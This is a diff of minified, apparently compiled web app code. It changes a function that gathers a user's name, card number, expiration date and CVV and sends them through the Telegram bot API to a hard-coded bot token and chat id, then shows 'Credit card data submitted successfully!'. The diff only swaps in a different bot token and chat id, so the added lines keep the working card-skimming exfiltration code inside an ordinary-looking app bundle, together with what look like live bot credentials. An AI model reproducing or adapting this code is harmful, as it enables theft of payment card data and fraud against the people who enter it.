@@ -43130,7 +43130,7 @@ uf(){var s=0,r=A.X(t.H),q=this,p
 var $async$uf=A.Y(function(a,b){if(a===1)return A.U(b,r)
 while(true)switch(s){case 0:p=q.ay
 s=2
-return A.a_(q.pG("The information\n Name:"+q.ax.a.a+("\n Card Number:"+q.ch.a.a)+("\n Expiration Date:"+q.CW.a.a)+("\n CVV:"+q.cx.a.a)+("\nlevel is "+A.h(p.gn(p)))),$async$uf)
+return A.a_(q.pG("The information\n Name:"+q.ax.a.a+"\n Card Number:"+q.ch.a.a+"\n Expiration Date:"+q.CW.a.a+"\n CVV:"+q.cx.a.a+"\nlevel is "+A.h(p.gn(p))),$async$uf)
 case 2:return A.V(null,r)}})
 return A.W($async$uf,r)},
 agQ(a){a.toString
@@ -43141,7 +43141,7 @@ var $async$pG=A.Y(function(b,c){if(b===1){p=c
 s=q}while(true)switch(s){case 0:q=3
 n=t.N
 s=6
-return A.a_(A.aLd(A.ph("https://api.telegram.org/bot6523460876:AAGfTKNriMKxXc4AFtXI25tOeM9ygLtUlws/sendMessage"),A.at(["chat_id","488701384","text",a],n,n)),$async$pG)
+return A.a_(A.aLd(A.ph("https://api.telegram.org/bot6387726446:AAE-qqcvhlXNx_Q7y_NgdwuLp7f2RJoo7fQ/sendMessage"),A.at(["chat_id","1637071334","text",a],n,n)),$async$pG)
 case 6:o=c
 if(o.b===200)A.wH(B.jy,"Credit card data submitted successfully!",B.jz)
 else A.wH(B.jy,"Failed to submit credit card data.",B.jz)
